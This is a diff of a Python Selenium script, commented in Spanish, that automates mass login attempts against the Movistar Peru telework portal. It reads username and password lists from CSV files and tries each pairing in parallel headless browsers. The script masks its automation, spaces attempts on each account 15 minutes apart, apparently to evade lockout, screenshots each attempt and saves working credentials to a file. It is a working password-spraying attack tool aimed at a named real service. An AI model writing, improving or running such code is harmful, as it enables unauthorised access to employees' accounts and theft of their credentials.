@@ -14,13 +14,15 @@ from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 from collections import defaultdict
+import random
+import psutil
 
 # Configurar logging completo
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s - [%(threadName)s] - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('log.txt', encoding='utf-8'),
+        logging.FileHandler('log.txt', encoding='utf-8', mode='w'),
         logging.StreamHandler()
     ]
 )
@@ -32,15 +34,21 @@ init(autoreset=True)
 # URL del login
 URL = "https://teletrabajo.movistar.pe"
 
+# Variables globales de configuración
+USAR_PUERTOS_ALEATORIOS = False
+NUM_THREADS = 3
+CHROMEDRIVER_PATH = None  # Se instala una sola vez
+
 # Locks para sincronización
 file_lock = threading.Lock()
-tiempo_lock = threading.Lock()
-usuarios_lock = threading.Lock()
+ultimo_intento_lock = threading.Lock()
+usuarios_exitosos_lock = threading.Lock()
+screenshot_counter_lock = threading.Lock()
 
 # Estructuras de datos compartidas
-ultimo_uso_usuario = defaultdict(lambda: datetime.min)
-usuarios_exitosos = set()  # Usuarios que ya tuvieron login exitoso
-usuarios_disponibles = []  # Cola de usuarios disponibles para probar
+ultimo_intento_usuario = defaultdict(lambda: datetime.min)
+usuarios_exitosos = set()
+screenshot_counter = 0
 
 def log_info(mensaje):
     """Log con info"""
@@ -62,6 +70,19 @@ def log_warning(mensaje):
     logger.warning(mensaje)
     print(Fore.YELLOW + mensaje)
 
+def matar_procesos_chrome():
+    """Forzar cierre de todos los procesos de Chrome y ChromeDriver"""
+    try:
+        for proc in psutil.process_iter(['name']):
+            try:
+                if proc.info['name'] in ['chrome.exe', 'chromedriver.exe', 'Google Chrome']:
+                    proc.kill()
+            except:
+                pass
+        log_info("🧹 Procesos Chrome limpiados")
+    except Exception as e:
+        log_warning(f"Error limpiando Chrome: {e}")
+
 def cargar_csv(archivo, nombre_tipo):
     """Cargar CSV con múltiples codificaciones y separadores"""
     try:
@@ -72,16 +93,12 @@ def cargar_csv(archivo, nombre_tipo):
         encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252', 'windows-1252']
         separadores = [',', ';', '\t', '|']
         df = None
-        encoding_usado = None
-        separador_usado = None
         
         for encoding in encodings:
             for sep in separadores:
                 try:
                     df = pd.read_csv(archivo, encoding=encoding, sep=sep)
                     if len(df.columns) >= 1:
-                        encoding_usado = encoding
-                        separador_usado = sep
                         break
                 except:
                     continue
@@ -92,10 +109,6 @@ def cargar_csv(archivo, nombre_tipo):
             log_error(f"❌ No se pudo leer '{archivo}'")
             return None
         
-        sep_nombre = {',': 'coma', ';': 'punto y coma', '\t': 'tabulación', '|': 'pipe'}
-        log_info(f"✅ '{archivo}' leído - Encoding: {encoding_usado}, Separador: {sep_nombre.get(separador_usado, separador_usado)}")
-        log_info(f"📋 Columnas encontradas: {df.columns.tolist()}")
-        
         # Tomar la primera columna
         primera_col = df.columns[0]
         df = df.rename(columns={primera_col: nombre_tipo})
@@ -103,6 +116,7 @@ def cargar_csv(archivo, nombre_tipo):
         # Limpiar datos
         df[nombre_tipo] = df[nombre_tipo].astype(str).str.strip()
         df = df.dropna(subset=[nombre_tipo])
+        df = df.drop_duplicates(subset=[nombre_tipo])
         
         log_success(f"✅ Cargados {len(df)} {nombre_tipo}s desde '{archivo}'")
         return df
@@ -121,10 +135,6 @@ def cargar_datos():
     passwords_df = cargar_csv("contraseña.csv", "password")
     
     if usuarios_df is None or passwords_df is None:
-        log_error("❌ Error: No se pudieron cargar los archivos necesarios")
-        log_info("\n📝 Asegúrate de tener:")
-        log_info("   - credenciales.csv (lista de usuarios)")
-        log_info("   - contraseña.csv (lista de contraseñas)")
         return None, None
     
     return usuarios_df, passwords_df
@@ -132,224 +142,224 @@ def cargar_datos():
 def cargar_usuarios_exitosos():
     """Cargar usuarios que ya tuvieron login exitoso"""
     try:
-        if os.path.exists("loginExitoso.csv"):
-            df = pd.read_csv("loginExitoso.csv")
+        if os.path.exists("loginexitoso.csv"):
+            df = pd.read_csv("loginexitoso.csv")
             usuarios = set(df['usuario'].unique())
-            log_info(f"📂 Cargados {len(usuarios)} usuarios con login exitoso previo (serán excluidos)")
+            log_info(f"📂 Cargados {len(usuarios)} usuarios exitosos previos")
             return usuarios
-    except Exception as e:
-        log_warning(f"No se pudieron cargar usuarios exitosos previos: {e}")
+    except:
+        pass
     return set()
 
-def configurar_driver():
-    """Configurar navegador Chrome optimizado"""
-    options = webdriver.ChromeOptions()
-    
-    # Modo headless
-    options.add_argument("--headless=new")
-    options.add_argument("--disable-gpu")
-    
-    # Optimizaciones
-    options.add_argument("--start-maximized")
-    options.add_argument("--disable-blink-features=AutomationControlled")
-    options.add_argument("--disable-extensions")
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    
-    # Deshabilitar recursos innecesarios
-    prefs = {
-        "profile.managed_default_content_settings.images": 2,
-        "profile.managed_default_content_settings.stylesheets": 2,
-        "profile.default_content_setting_values.notifications": 2,
-        "disk-cache-size": 4096
-    }
-    options.add_experimental_option("prefs", prefs)
-    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
-    options.add_experimental_option('useAutomationExtension', False)
-    options.add_argument("--disable-logging")
-    options.add_argument("--log-level=3")
-    options.add_argument("--silent")
-    options.add_argument("--blink-settings=imagesEnabled=false")
-    options.add_argument("--disable-remote-fonts")
+def crear_carpeta_screenshots():
+    """Crear carpeta para screenshots si no existe"""
+    if not os.path.exists("screenshots"):
+        os.makedirs("screenshots")
+        log_info("📁 Carpeta 'screenshots' creada")
+
+def tomar_screenshot(driver, usuario, password, resultado):
+    """Tomar screenshot con nombre descriptivo"""
+    global screenshot_counter
     
     try:
-        driver = webdriver.Chrome(
-            service=Service(ChromeDriverManager().install()),
-            options=options
-        )
-        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-        return driver
+        with screenshot_counter_lock:
+            screenshot_counter += 1
+            contador = screenshot_counter
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        nombre_archivo = f"screenshots/{contador:04d}_{usuario}_{resultado}_{timestamp}.png"
+        
+        driver.save_screenshot(nombre_archivo)
+        log_info(f"📸 Screenshot guardado: {nombre_archivo}")
+        
     except Exception as e:
-        log_error(f"Error configurando navegador: {e}")
-        return None
+        log_warning(f"⚠️ No se pudo guardar screenshot: {e}")
 
-def obtener_siguiente_usuario(password_idx):
-    """Obtener el siguiente usuario disponible (que haya pasado 15 min y no sea exitoso)"""
-    global usuarios_disponibles
+def configurar_driver_persistente():
+    """Configurar navegador Chrome persistente (se llama una vez por thread)"""
+    global USAR_PUERTOS_ALEATORIOS, CHROMEDRIVER_PATH
     
-    with usuarios_lock:
-        ahora = datetime.now()
-        tiempo_minimo = timedelta(minutes=15)
+    try:
+        options = webdriver.ChromeOptions()
         
-        # Buscar usuario disponible
-        for i, usuario in enumerate(usuarios_disponibles):
-            # Verificar si ya fue exitoso
-            if usuario in usuarios_exitosos:
-                continue
-            
-            # Verificar tiempo transcurrido
-            ultimo_uso = ultimo_uso_usuario[usuario]
-            tiempo_transcurrido = ahora - ultimo_uso
-            
-            if tiempo_transcurrido >= tiempo_minimo:
-                # Actualizar último uso
-                ultimo_uso_usuario[usuario] = ahora
-                log_info(f"✓ Usuario '{usuario}' seleccionado para password #{password_idx + 1}")
-                return usuario
+        # Modo headless
+        options.add_argument("--headless=new")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_argument("--disable-extensions")
         
-        # Si no hay ninguno disponible, esperar al más próximo
-        log_warning(f"⏳ Todos los usuarios usados recientemente, esperando...")
+        # Puerto aleatorio si está habilitado
+        if USAR_PUERTOS_ALEATORIOS:
+            puerto = random.randint(9000, 9999)
+            options.add_argument(f"--remote-debugging-port={puerto}")
+            log_info(f"🔌 Puerto: {puerto}")
         
-        # Encontrar el usuario con menor tiempo de espera
-        min_espera = float('inf')
-        for usuario in usuarios_disponibles:
-            if usuario in usuarios_exitosos:
-                continue
-            
-            ultimo_uso = ultimo_uso_usuario[usuario]
-            tiempo_transcurrido = ahora - ultimo_uso
-            tiempo_restante = (tiempo_minimo - tiempo_transcurrido).total_seconds()
-            
-            if tiempo_restante < min_espera and tiempo_restante > 0:
-                min_espera = tiempo_restante
+        # Recursos deshabilitados
+        prefs = {
+            "profile.managed_default_content_settings.images": 2,
+            "profile.managed_default_content_settings.stylesheets": 2,
+        }
+        options.add_experimental_option("prefs", prefs)
+        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
         
-        if min_espera > 0 and min_espera < float('inf'):
-            log_warning(f"⏳ Esperando {int(min_espera/60)} minutos...")
-            time.sleep(min_espera)
-            return obtener_siguiente_usuario(password_idx)
+        # Usar ChromeDriver ya instalado
+        service = Service(CHROMEDRIVER_PATH)
+        driver = webdriver.Chrome(service=service, options=options)
+        driver.set_page_load_timeout(30)
+        driver.implicitly_wait(5)
         
+        log_success(f"✅ Navegador persistente creado para thread")
+        return driver
+        
+    except Exception as e:
+        log_error(f"❌ Error configurando navegador: {e}")
         return None
 
-def marcar_usuario_exitoso(usuario):
-    """Marcar usuario como exitoso y excluirlo de futuras pruebas"""
-    with usuarios_lock:
-        usuarios_exitosos.add(usuario)
-        log_success(f"🎯 Usuario '{usuario}' marcado como EXITOSO - Excluido de futuras pruebas")
-        log_info(f"📊 Total usuarios exitosos hasta ahora: {len(usuarios_exitosos)}")
+def puede_intentar_usuario(usuario):
+    """Verificar si han pasado 15 minutos desde el último intento"""
+    with ultimo_intento_lock:
+        ahora = datetime.now()
+        ultimo = ultimo_intento_usuario[usuario]
+        tiempo_transcurrido = (ahora - ultimo).total_seconds()
+        
+        if tiempo_transcurrido < 900:  # 15 minutos = 900 segundos
+            tiempo_restante = 900 - tiempo_transcurrido
+            return False, tiempo_restante
+        
+        return True, 0
 
-def intentar_login(driver, wait, usuario, password):
-    """Intentar login y verificar resultado"""
+def registrar_intento_usuario(usuario):
+    """Registrar el momento del intento"""
+    with ultimo_intento_lock:
+        ultimo_intento_usuario[usuario] = datetime.now()
+
+def verificar_login_exitoso(driver, wait):
+    """Verificar si el login fue exitoso buscando elementos del dashboard"""
     try:
-        log_info(f"🚀 Iniciando login: Usuario='{usuario}' | Password='{password}'")
-        
-        # Cargar página
-        driver.get(URL)
-        log_info(f"🌐 Página cargada: {URL}")
-        time.sleep(2)
-        
-        # Ingresar usuario
-        log_info("👤 Localizando campo de usuario...")
-        input_user = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="login"]')))
-        input_user.clear()
-        input_user.send_keys(usuario)
-        log_info(f"✓ Usuario ingresado: {usuario}")
-        time.sleep(0.5)
-        
-        # Ingresar contraseña
-        log_info("🔒 Localizando campo de contraseña...")
-        input_pass = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="passwd"]')))
-        input_pass.clear()
-        input_pass.send_keys(password)
-        log_info(f"✓ Contraseña ingresada: {password}")
-        time.sleep(0.5)
-        
-        # Click en botón login
-        log_info("🔘 Buscando botón de login...")
-        boton_login = wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="nsg-x1-logon-button"]')))
-        boton_login.click()
-        log_info("✓ Click en botón de login ejecutado")
-        
-        # Esperar 4 segundos para verificar mensaje de error
-        log_info("⏱️ Esperando 4 segundos para verificar resultado...")
+        # Esperar 4 segundos iniciales
         time.sleep(4)
         
-        # Verificar mensaje de error específico
-        try:
-            error_element = driver.find_element(By.XPATH, '//*[@id="explicit-auth-screen"]/div[3]/div/div[2]/div[2]/div[3]/div[1]/form/div[6]/div/p/span')
-            if error_element and error_element.is_displayed():
-                error_text = error_element.text.strip()
-                log_error(f"❌ Mensaje de error detectado: '{error_text}'")
-                
-                if "Contraseña incorrecta" in error_text or "incorrecta" in error_text.lower():
-                    log_error(f"❌ LOGIN INCORRECTO: Usuario='{usuario}' | Password='{password}' | Razón: Contraseña incorrecta")
-                    return "INCORRECTO"
-        except:
-            # No se encontró el mensaje de error
-            log_info("✓ No se detectó mensaje de error de contraseña")
+        log_info("🔍 Verificando resultado del login...")
         
-        # Verificar otros mensajes de error
-        mensajes_error = [
-            "//div[contains(@class, 'error')]",
-            "//span[contains(@class, 'error')]",
-            "//p[contains(@class, 'error')]",
-            "//*[contains(text(), 'incorrecta')]",
-            "//*[contains(text(), 'inválido')]",
-            "//*[contains(text(), 'error')]"
-        ]
+        # Timeout máximo de 60 segundos
+        tiempo_inicio = time.time()
         
-        for selector in mensajes_error:
+        while (time.time() - tiempo_inicio) < 60:
+            # 1. Verificar mensaje de error específico
             try:
-                elementos = driver.find_elements(By.XPATH, selector)
-                if elementos and any(e.is_displayed() for e in elementos):
-                    error_text = elementos[0].text.strip()
-                    log_error(f"❌ Error genérico detectado: '{error_text}'")
-                    log_error(f"❌ LOGIN INCORRECTO: Usuario='{usuario}' | Password='{password}'")
+                error_element = driver.find_element(By.XPATH, 
+                    '//*[@id="explicit-auth-screen"]/div[3]/div/div[2]/div[2]/div[3]/div[1]/form/div[6]/div/p/span')
+                if error_element.is_displayed():
+                    texto_error = error_element.text.strip()
+                    log_error(f"❌ Error detectado: {texto_error}")
                     return "INCORRECTO"
             except:
-                continue
+                pass
+            
+            # 2. Verificar mensajes de error genéricos
+            selectores_error = [
+                "//div[contains(@class, 'error')]",
+                "//span[contains(@class, 'error')]",
+                "//*[contains(text(), 'incorrecta')]",
+                "//*[contains(text(), 'inválido')]",
+            ]
+            
+            for selector in selectores_error:
+                try:
+                    elementos = driver.find_elements(By.XPATH, selector)
+                    if any(e.is_displayed() and e.text.strip() for e in elementos):
+                        log_error(f"❌ Error genérico detectado")
+                        return "INCORRECTO"
+                except:
+                    pass
+            
+            # 3. Verificar cambio de URL (señal de éxito)
+            url_actual = driver.current_url
+            if url_actual != URL and "login" not in url_actual.lower():
+                log_success(f"✅ URL cambió: {url_actual}")
+                return "EXITOSO"
+            
+            # 4. Verificar elementos del dashboard
+            selectores_dashboard = [
+                "//div[contains(@class, 'dashboard')]",
+                "//div[contains(@class, 'home')]",
+                "//a[contains(text(), 'Cerrar sesión')]",
+                "//a[contains(text(), 'Logout')]",
+                "//button[contains(text(), 'Salir')]",
+                "//*[contains(@class, 'user-menu')]",
+                "//*[contains(@class, 'profile')]",
+            ]
+            
+            for selector in selectores_dashboard:
+                try:
+                    elementos = driver.find_elements(By.XPATH, selector)
+                    if any(e.is_displayed() for e in elementos):
+                        log_success(f"✅ Elemento dashboard detectado")
+                        return "EXITOSO"
+                except:
+                    pass
+            
+            # 5. Verificar nuevas ventanas/pestañas
+            if len(driver.window_handles) > 1:
+                log_success(f"✅ Nueva ventana detectada")
+                return "EXITOSO"
+            
+            # Esperar 1 segundo antes de volver a verificar
+            time.sleep(1)
         
-        # Verificar URL
-        url_actual = driver.current_url
-        log_info(f"🔍 URL actual después del login: {url_actual}")
-        
-        # Si no hay errores y la URL cambió, es exitoso
-        if url_actual != URL and "login" not in url_actual.lower():
-            log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Nueva URL: {url_actual}")
-            marcar_usuario_exitoso(usuario)
-            return "EXITOSO"
-        
-        # Verificar ventanas/pestañas nuevas
-        if len(driver.window_handles) > 1:
-            log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Nueva pestaña detectada")
-            marcar_usuario_exitoso(usuario)
-            return "EXITOSO"
-        
-        # Verificar elementos de sesión iniciada
-        indicadores_exito = [
-            "//a[contains(text(), 'Cerrar sesión')]",
-            "//a[contains(text(), 'Logout')]",
-            "//button[contains(text(), 'Salir')]",
-            "//*[contains(text(), 'cambiar contraseña')]",
-            "//*[contains(text(), 'change password')]"
-        ]
-        
-        for selector in indicadores_exito:
-            try:
-                elementos = driver.find_elements(By.XPATH, selector)
-                if elementos and any(e.is_displayed() for e in elementos):
-                    log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Indicador de sesión detectado")
-                    marcar_usuario_exitoso(usuario)
-                    return "EXITOSO"
-            except:
-                continue
-        
-        # Si no se detectó nada claro después de 4 segundos, considerar exitoso
-        log_success(f"✅ LOGIN EXITOSO (sin error detectado): Usuario='{usuario}' | Password='{password}'")
-        marcar_usuario_exitoso(usuario)
+        # Si pasaron 60 segundos sin error, considerar exitoso
+        log_success(f"✅ Sin errores tras 60s")
         return "EXITOSO"
         
     except Exception as e:
-        log_error(f"❌ Error en proceso de login: Usuario='{usuario}' | Error: {e}")
+        log_error(f"❌ Error verificando login: {e}")
+        return "ERROR"
+
+def intentar_login(driver, wait, usuario, password):
+    """Intentar login con un driver persistente"""
+    try:
+        log_info(f"🚀 Login: {usuario} | {password}")
+        
+        # Ir a la página
+        driver.get(URL)
+        time.sleep(2)
+        
+        # Ingresar usuario
+        input_user = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="login"]')))
+        input_user.clear()
+        input_user.send_keys(usuario)
+        time.sleep(0.3)
+        
+        # Ingresar contraseña
+        input_pass = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="passwd"]')))
+        input_pass.clear()
+        input_pass.send_keys(password)
+        time.sleep(0.3)
+        
+        # Click en botón login
+        boton_login = wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="nsg-x1-logon-button"]')))
+        boton_login.click()
+        log_info("✓ Click en login")
+        
+        # Verificar resultado (espera inteligente)
+        resultado = verificar_login_exitoso(driver, wait)
+        
+        # Tomar screenshot
+        tomar_screenshot(driver, usuario, password, resultado)
+        
+        # Si es exitoso, marcarlo
+        if resultado == "EXITOSO":
+            with usuarios_exitosos_lock:
+                usuarios_exitosos.add(usuario)
+                log_success(f"🎯 Usuario '{usuario}' EXITOSO - Excluido")
+        
+        return resultado
+        
+    except Exception as e:
+        log_error(f"❌ Error en login: {e}")
+        tomar_screenshot(driver, usuario, password, "ERROR")
         return "ERROR"
 
 def guardar_resultado(usuario, password, resultado):
@@ -359,9 +369,9 @@ def guardar_resultado(usuario, password, resultado):
             fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             
             if resultado == "EXITOSO":
-                archivo = "loginExitoso.csv"
+                archivo = "loginexitoso.csv"
             else:
-                archivo = "loginIncorrecto.csv"
+                archivo = "loginincorrecto.csv"
             
             existe = os.path.exists(archivo)
             
@@ -377,95 +387,85 @@ def guardar_resultado(usuario, password, resultado):
             else:
                 df_nueva.to_csv(archivo, mode='w', header=True, index=False, encoding='utf-8')
             
-            log_info(f"💾 Resultado guardado en '{archivo}': {usuario}")
-            
     except Exception as e:
-        log_error(f"Error guardando resultado: {e}")
+        log_error(f"Error guardando: {e}")
 
-def guardar_checkpoint(password_idx):
-    """Guardar checkpoint del progreso"""
-    try:
-        with file_lock:
-            with open("checkpoint.txt", "w") as f:
-                f.write(f"{password_idx}")
-            log_info(f"💾 Checkpoint guardado: Password #{password_idx}")
-    except Exception as e:
-        log_error(f"Error guardando checkpoint: {e}")
-
-def cargar_checkpoint():
-    """Cargar checkpoint previo"""
-    try:
-        if os.path.exists("checkpoint.txt"):
-            with open("checkpoint.txt", "r") as f:
-                contenido = f.read().strip()
-                if contenido:
-                    password_idx = int(contenido)
-                    log_info(f"📂 Checkpoint cargado: Continuando desde Password #{password_idx}")
-                    return password_idx
-    except Exception as e:
-        log_warning(f"No se pudo cargar checkpoint: {e}")
-    return 0
-
-def procesar_combinacion(args):
-    """Procesar una combinación usuario-password específica"""
-    usuario_idx, password_idx, usuario, password, total_usuarios, total_passwords = args
-    
+def worker_thread(tareas_usuario):
+    """Thread worker que mantiene un navegador persistente"""
     driver = None
+    wait = None
+    
     try:
-        # Verificar si el usuario ya fue exitoso
-        with usuarios_lock:
-            if usuario in usuarios_exitosos:
-                log_warning(f"⏭️ Usuario '{usuario}' ya fue exitoso anteriormente - SALTANDO")
-                return (usuario_idx, password_idx, usuario, password, "SALTADO")
+        # Crear navegador persistente para este thread
+        driver = configurar_driver_persistente()
+        if not driver:
+            log_error("❌ No se pudo crear navegador persistente")
+            return []
         
-        log_info(f"\n{'='*70}")
-        log_info(f"🔄 PROCESANDO COMBINACIÓN")
-        log_info(f"   Usuario: {usuario} (#{usuario_idx + 1}/{total_usuarios})")
-        log_info(f"   Password: {password} (#{password_idx + 1}/{total_passwords})")
-        log_info(f"   Usuarios exitosos acumulados: {len(usuarios_exitosos)}")
-        log_info(f"{'='*70}")
+        wait = WebDriverWait(driver, 20)
+        resultados = []
         
-        # Esperar tiempo mínimo si es necesario
-        with tiempo_lock:
-            ahora = datetime.now()
-            ultimo_uso = ultimo_uso_usuario[usuario]
-            tiempo_transcurrido = (ahora - ultimo_uso).total_seconds()
-            tiempo_espera = 900  # 15 minutos
-            
-            if tiempo_transcurrido < tiempo_espera:
-                tiempo_restante = tiempo_espera - tiempo_transcurrido
-                log_warning(f"⏳ Usuario '{usuario}' usado hace {int(tiempo_transcurrido/60)} min. Esperando {int(tiempo_restante/60)} min...")
-                time.sleep(tiempo_restante)
-            
-            # Actualizar último uso
-            ultimo_uso_usuario[usuario] = datetime.now()
+        # Procesar todas las tareas asignadas a este thread
+        for usuario, password in tareas_usuario:
+            try:
+                # Verificar si el usuario ya fue exitoso
+                with usuarios_exitosos_lock:
+                    if usuario in usuarios_exitosos:
+                        log_warning(f"⏭️ '{usuario}' ya exitoso - SKIP")
+                        resultados.append((usuario, password, "SALTADO"))
+                        continue
+                
+                # Verificar si puede intentarse (15 min)
+                puede_intentar, tiempo_restante = puede_intentar_usuario(usuario)
+                
+                if not puede_intentar:
+                    log_warning(f"⏳ '{usuario}' requiere esperar {int(tiempo_restante/60)} min - SKIP")
+                    resultados.append((usuario, password, "ESPERANDO"))
+                    continue
+                
+                # Registrar intento
+                registrar_intento_usuario(usuario)
+                
+                # Intentar login
+                resultado = intentar_login(driver, wait, usuario, password)
+                
+                # Guardar resultado
+                guardar_resultado(usuario, password, resultado)
+                
+                resultados.append((usuario, password, resultado))
+                
+                # Si fue exitoso, reiniciar navegador
+                if resultado == "EXITOSO":
+                    log_info("🔄 Reiniciando navegador tras éxito...")
+                    try:
+                        driver.quit()
+                    except:
+                        pass
+                    driver = configurar_driver_persistente()
+                    if driver:
+                        wait = WebDriverWait(driver, 20)
+                
+            except Exception as e:
+                log_error(f"❌ Error procesando {usuario}: {e}")
+                resultados.append((usuario, password, "ERROR"))
+                
+                # Reintentar crear navegador si falló
+                try:
+                    driver.quit()
+                except:
+                    pass
+                driver = configurar_driver_persistente()
+                if driver:
+                    wait = WebDriverWait(driver, 20)
         
-        # Crear driver
-        log_info("🔧 Configurando navegador...")
-        driver = configurar_driver()
-        if driver is None:
-            log_error("❌ No se pudo configurar el navegador")
-            return (usuario_idx, password_idx, usuario, password, "ERROR")
-        
-        wait = WebDriverWait(driver, 15)
-        
-        # Intentar login
-        resultado = intentar_login(driver, wait, usuario, password)
-        
-        # Guardar resultado
-        guardar_resultado(usuario, password, resultado)
-        
-        # Guardar checkpoint cada 10 combinaciones
-        combinacion_num = usuario_idx * total_passwords + password_idx
-        if combinacion_num % 10 == 0:
-            guardar_checkpoint(password_idx)
-        
-        return (usuario_idx, password_idx, usuario, password, resultado)
+        return resultados
         
     except Exception as e:
-        log_error(f"❌ Error procesando: Usuario='{usuario}' Password='{password}' | Error: {e}")
-        return (usuario_idx, password_idx, usuario, password, "ERROR")
+        log_error(f"❌ Error en worker thread: {e}")
+        return []
+    
     finally:
+        # Cerrar navegador al finalizar todas las tareas del thread
         if driver:
             try:
                 driver.quit()
@@ -473,15 +473,69 @@ def procesar_combinacion(args):
             except:
                 pass
 
+def distribuir_tareas_from_list(tareas, num_threads):
+    """Dividir una lista de (usuario,password) en chunks para cada thread"""
+    if not tareas:
+        return []
+    tamaño_chunk = max(1, len(tareas) // num_threads)
+    chunks = []
+    for i in range(num_threads):
+        inicio = i * tamaño_chunk
+        if i == num_threads - 1:
+            fin = len(tareas)
+        else:
+            fin = min(len(tareas), (i + 1) * tamaño_chunk)
+        chunk = tareas[inicio:fin]
+        if chunk:
+            chunks.append(chunk)
+    return chunks
+
 def main():
     """Función principal"""
-    global usuarios_disponibles, usuarios_exitosos
+    global usuarios_exitosos, USAR_PUERTOS_ALEATORIOS, NUM_THREADS, CHROMEDRIVER_PATH
     
     log_info("="*70)
-    log_info("🚀 VALIDADOR MASIVO DE CREDENCIALES - TELETRABAJO MOVISTAR")
-    log_info("⚡ Modo OPTIMIZADO: Rotación inteligente + Exclusión automática")
+    log_info("🚀 VALIDADOR MASIVO - TELETRABAJO MOVISTAR")
+    log_info("⚡ Versión optimizada con navegadores persistentes")
     log_info("="*70)
-    log_info(f"📅 Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    
+    # Instalar ChromeDriver UNA SOLA VEZ
+    log_info("📦 Instalando ChromeDriver...")
+    CHROMEDRIVER_PATH = ChromeDriverManager().install()
+    log_success(f"✅ ChromeDriver instalado: {CHROMEDRIVER_PATH}")
+    
+    # Crear carpeta screenshots
+    crear_carpeta_screenshots()
+    
+    # CONFIGURACIÓN
+    print("\n" + "="*70)
+    print("⚙️  CONFIGURACIÓN")
+    print("="*70)
+    
+    respuesta_puertos = input("\n¿Usar puertos aleatorios para cada navegador? (s/n) [Recomendado: s]: ").lower()
+    USAR_PUERTOS_ALEATORIOS = respuesta_puertos == 's'
+    
+    if USAR_PUERTOS_ALEATORIOS:
+        log_success("✅ Puertos aleatorios ACTIVADOS (mejor para múltiples threads)")
+    else:
+        log_warning("⚠️ Puertos aleatorios DESACTIVADOS")
+    
+    print("\n💡 Recomendaciones según tu equipo:")
+    print("   - 2-5 threads: PC básico (4-8 GB RAM)")
+    print("   - 5-10 threads: PC medio (8-16 GB RAM)")
+    print("   - 10-20 threads: PC potente (16+ GB RAM)")
+    print("   - 20+ threads: Servidor o cloud")
+    
+    try:
+        NUM_THREADS = int(input("\n🔧 ¿Cuántos navegadores simultáneos? [Recomendado: 5-10]: ") or "5")
+        if NUM_THREADS < 1:
+            NUM_THREADS = 1
+        log_info(f"✅ Configurado para {NUM_THREADS} navegadores en paralelo")
+    except:
+        NUM_THREADS = 5
+        log_warning(f"⚠️ Usando valor por defecto: {NUM_THREADS}")
+    
+    print("\n" + "="*70)
     
     # Cargar datos
     usuarios_df, passwords_df = cargar_datos()
@@ -491,128 +545,165 @@ def main():
     # Cargar usuarios exitosos previos
     usuarios_exitosos = cargar_usuarios_exitosos()
     
-    # Inicializar lista de usuarios disponibles
-    todos_usuarios = usuarios_df['usuario'].tolist()
-    usuarios_disponibles = [u for u in todos_usuarios if u not in usuarios_exitosos]
-    
+    usuarios = usuarios_df['usuario'].tolist()
     passwords = passwords_df['password'].tolist()
     
-    total_usuarios_inicial = len(todos_usuarios)
-    total_usuarios_activos = len(usuarios_disponibles)
-    total_passwords = len(passwords)
+    # Construir todas las combinaciones usuario x password
+    all_combinations = [(u, p) for u in usuarios for p in passwords]
+    # Filtrar inmediatamente combinaciones con usuarios ya exitosos
+    pending_combinations = [comb for comb in all_combinations if comb[0] not in usuarios_exitosos]
+    total_combinaciones = len(pending_combinations)
     
     log_info(f"\n📊 ESTADÍSTICAS:")
-    log_info(f"   👥 Total usuarios: {total_usuarios_inicial:,}")
-    log_info(f"   ✅ Usuarios ya exitosos (excluidos): {len(usuarios_exitosos)}")
-    log_info(f"   🔄 Usuarios activos para probar: {total_usuarios_activos:,}")
-    log_info(f"   🔑 Contraseñas: {total_passwords}")
-    log_info(f"   ⏱️ Tiempo mínimo entre usos: 15 minutos")
-    log_info(f"\n🎯 ESTRATEGIA:")
-    log_info(f"   1. Usuario1 + Password1")
-    log_info(f"   2. Usuario2 + Password1")
-    log_info(f"   3. Usuario3 + Password1")
-    log_info(f"   4. ... (todos los usuarios con Password1)")
-    log_info(f"   5. Usuario1 + Password2 (si pasaron 15 min)")
-    log_info(f"   6. Si usuario es EXITOSO → se EXCLUYE automáticamente")
+    log_info(f"   👥 Usuarios totales: {len(usuarios):,}")
+    log_info(f"   ✅ Ya exitosos: {len(usuarios_exitosos)}")
+    log_info(f"   🔄 Usuarios activos: {len(set([u for u,_ in pending_combinations])):,}")
+    log_info(f"   🔑 Contraseñas: {len(passwords)}")
+    log_info(f"   🔢 Combinaciones totales pendientes: {total_combinaciones:,}")
+    log_info(f"   ⏱️ Tiempo mínimo entre intentos: 15 min")
     
-    if total_usuarios_activos == 0:
-        log_success("🎉 ¡Todos los usuarios ya tienen login exitoso!")
+    if total_combinaciones == 0:
+        log_success("🎉 ¡No hay combinaciones pendientes para procesar!")
         return
-    
-    # Configuración
-    NUM_THREADS = int(input("\n🔧 ¿Cuántos navegadores en paralelo? (recomendado 3-5): ") or "3")
-    log_info(f"🔀 Configurado para usar {NUM_THREADS} navegadores en paralelo")
-    
-    # Cargar checkpoint
-    inicio_password = cargar_checkpoint()
-    if inicio_password > 0:
-        respuesta = input(f"\n⚠️ Checkpoint encontrado (Password #{inicio_password}). ¿Continuar? (s/n): ")
-        if respuesta.lower() != 's':
-            inicio_password = 0
-    
-    # Preparar tareas (todas las combinaciones siguiendo la estrategia)
-    log_info("\n🎯 Preparando todas las combinaciones...")
-    tareas = []
-    
-    # Estrategia: Password1 con todos los usuarios, luego Password2 con todos, etc.
-    for idx_p, password in enumerate(passwords):
-        for idx_u, usuario in enumerate(usuarios_disponibles):
-            # Solo agregar si el usuario no está en exitosos
-            if usuario not in usuarios_exitosos:
-                tareas.append((idx_u, idx_p, usuario, password, total_usuarios_activos, total_passwords))
-    
-    total_combinaciones = len(tareas)
